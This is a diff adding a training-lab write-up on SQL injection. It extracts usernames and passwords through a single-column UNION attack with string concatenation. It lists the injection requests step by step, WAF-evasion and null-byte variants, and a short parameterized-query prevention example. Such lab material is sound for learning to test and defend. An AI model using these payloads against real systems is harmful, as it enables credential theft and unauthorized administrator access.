@@ -1,0 +1,36 @@
+# SQL Injection Lab 5: Single Column Data Extraction
+# Objective
+Retrieve usernames and passwords from the users table when the UNION attack only returns a single column, by concatenating values with a separator.
+
+# Solution
+    1. Determine Number of Columns
+      First verify the number of columns (should be 1 for this lab):
+          GET /filter?category=Gifts' ORDER BY 1-- HTTP/1.1
+          GET /filter?category=Gifts' ORDER BY 2-- HTTP/1.1  ← This fails
+    2. Confirm String Column
+      Check if the single column accepts strings:
+          GET /filter?category=Gifts' UNION SELECT 'test'-- HTTP/1.1
+    3. Concatenate Data with Separator
+      Use database-specific concatenation to retrieve both username and password:
+          GET /filter?category=Gifts' UNION SELECT username||'~'||password FROM users-- HTTP/1.1
+    4. Extract Administrator Credentials
+    5. Login as Administrator
+      Use the extracted credentials to log in.
+
+# Key Techniques
+    String Concatenation: Different syntax per DBMS
+    Separator Character: Using ~ to distinguish values
+    Single Column Exploitation: Overcoming UNION limitations
+
+# Perevention 
+    String query = "SELECT * FROM products WHERE category = ?";
+    PreparedStatement stmt = connection.prepareStatement(query);
+    stmt.setString(1, input);
+
+# Troubleshooting
+    If concatenation fails:
+      1. Try different separators: `||'-'||`, `||'#'||`
+      2. Verify column supports strings with: `UNION SELECT 'a'--`
+      3. Check for WAF blocking: `UNION/**/SELECT`...
+      4. Test null byte termination: `...users%00`
+
